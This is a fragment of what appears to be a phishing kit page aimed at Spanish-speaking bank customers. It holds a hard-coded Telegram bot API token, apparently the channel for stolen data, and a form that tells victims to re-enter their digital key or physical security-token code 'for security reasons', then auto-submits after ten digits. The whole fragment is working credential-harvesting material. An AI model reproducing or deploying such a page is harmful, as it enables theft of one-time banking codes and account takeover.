...
$apiToken = "5908326039:AAE4gsL71Y56dVGdd93KiB51BykG8dPAPYY";
...
<br><h1>Por motivos de seguridad ingresá tu <br><br> LLAVE DIGITAL ó<br><br> TOKEN FISICO NUEVAMENTE</h1><br>
 ...
 <input type="tel" maxlength="10" class="form-control"  style="border:1px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();"  name="Codigo2"
placeholder="Ingresa el código nuevamente" autofocus required>
   </div>
  <br>
    <br>
